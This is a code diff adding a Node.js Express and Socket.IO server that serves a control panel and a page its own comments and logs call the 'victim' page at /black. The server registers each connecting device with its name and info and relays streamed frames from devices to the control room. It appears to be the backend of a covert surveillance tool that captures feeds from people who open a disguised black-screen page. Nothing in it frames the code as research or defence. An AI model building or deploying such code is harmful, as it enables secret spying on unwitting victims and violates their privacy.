@@ -1,0 +1,87 @@
+const express = require('express');
+const http = require('http');
+const socketIo = require('socket.io');
+const cors = require('cors');
+const path = require('path');
+
+const app = express();
+const server = http.createServer(app);
+const io = socketIo(server, {
+    cors: { origin: "*", methods: ["GET", "POST"] }
+});
+
+app.use(cors());
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json());
+
+const rooms = {
+    main: { devices: [] },
+    room2: { devices: [] },
+    room3: { devices: [] }
+};
+
+// Serve control panel
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Serve victim page
+app.get('/black', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'black_screen.html'));
+});
+
+io.on('connection', (socket) => {
+    console.log(`🟢 Device connected: ${socket.id}`);
+    
+    socket.on('device-connected', (data) => {
+        const roomName = data.room || 'main';
+        const room = rooms[roomName];
+        
+        if (!room.devices.find(d => d.id === socket.id)) {
+            room.devices.push({
+                id: socket.id,
+                name: data.name || `Device-${Math.floor(Math.random()*1000)}`,
+                info: data.info,
+                room: roomName
+            });
+        }
+        
+        socket.join('control-room');
+        socket.join(roomName);
+        
+        // Send to control panel
+        io.to('control-room').emit('device-connected', {
+            id: socket.id,
+            room: roomName,
+            name: data.name,
+            info: data.info
+        });
+        
+        console.log(`📱 New device: ${data.name} in ${roomName}`);
+    });
+    
+    socket.on('stream-frame', (data) => {
+        io.to('control-room').emit('stream-data', {
+            deviceId: data.deviceId,
+            frame: data.frame,
+            timestamp: Date.now()
+        });
+    });
+    
+    socket.on('disconnect', () => {
+        // Remove from all rooms
+        Object.values(rooms).forEach(room => {
+            room.devices = room.devices.filter(d => d.id !== socket.id);
+        });
+        
+        io.to('control-room').emit('device-disconnected', socket.id);
+        console.log(`🔴 Device disconnected: ${socket.id}`);
+    });
+});
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`🚀 Server running on http://localhost:${PORT}`);
+    console.log(`📺 Control: http://localhost:${PORT}`);
+    console.log(`🖤 Victim: http://localhost:${PORT}/black`);
+});
